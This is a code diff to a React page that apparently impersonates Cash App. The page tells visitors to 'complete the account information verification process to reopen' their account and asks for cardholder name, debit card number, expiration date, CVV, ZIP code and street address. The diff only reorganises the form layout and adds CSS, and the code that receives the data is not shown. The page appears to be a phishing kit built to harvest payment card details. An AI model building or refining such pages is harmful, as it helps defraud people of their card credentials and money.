@@ -14,44 +14,53 @@ Complete the account information verification process to reopen your Cash App ac
         </p>
 
         {/* Form */}
-        <form className="form">
-          {/* Cardholder */}
-           <label className="label">Cardholder Name</label>
-          <input
-            type="text"
-   
-            className="input"
-          />
+<form className="form">
+  {/* Cardholder */}
+  <div className="field">
+    <label className="label">Cardholder Name</label>
+    <input type="text" className="input" />
+  </div>
+
+  {/* Card Number */}
+  <div className="field">
     <label className="label">Debit card number</label>
-          {/* Card Number */}
-          <input
-            type="text"
-            placeholder="0000 0000 0000 0000"
-            className="input"
-          />
+    <input type="text" placeholder="0000 0000 0000 0000" className="input" />
+  </div>
 
-          {/* Row Expiry, CVV, ZIP */}
-             
-          <div className="row">
-               <label className="label">Expiration</label>
-            <input type="text" placeholder="MM/YY" className="input" />
-               <label className="label">CVV</label>
-            <input type="text" placeholder="123" className="input" />
- <label className="label">ZIP code</label>
-            <input type="text" placeholder="12345" className="input" />
-          </div>
+  {/* Expiry, CVV, ZIP */}
+  <div className="row">
+    <div className="field">
+      <label className="label">Expiration</label>
+      <input type="text" placeholder="MM/YY" className="input" />
+    </div>
+    <div className="field">
+      <label className="label">CVV</label>
+      <input type="text" placeholder="123" className="input" />
+    </div>
+    <div className="field">
+      <label className="label">ZIP code</label>
+      <input type="text" placeholder="12345" className="input" />
+    </div>
+  </div>
 
-          {/* Address */}
-   <label className="label">Street Address</label>
-          <input type="text" placeholder="Street Address" className="input" />
+  {/* Address */}
+  <div className="field">
+    <label className="label">Street Address</label>
+    <input type="text" placeholder="Street Address" className="input" />
+  </div>
 
-          {/* City + State */}
-          <div className="row">
-   <label className="label">City</label>
-            <input type="text" placeholder="City" className="input" />
-        <label className="label">State</label>
-            <input type="text" placeholder="State" className="input" />
-          </div>
+  {/* City + State */}
+  <div className="row">
+    <div className="field">
+      <label className="label">City</label>
+      <input type="text" placeholder="City" className="input" />
+    </div>
+    <div className="field">
+      <label className="label">State</label>
+      <input type="text" placeholder="State" className="input" />
+    </div>
+  </div>
+</form>
 
           {/* Buttons */}
           <div className="buttons">
@@ -93,6 +102,17 @@ Complete the account information verification process to reopen your Cash App ac
           font-weight: 600;
           margin-bottom: 8px;
         }
+.field {
+  display: flex;
+  flex-direction: column;
+}
+
+.label {
+  font-size: 13px;
+  font-weight: 500;
+  margin-bottom: 4px;
+  color: #888;
+}
 
         .subtitle {
           color: #888;
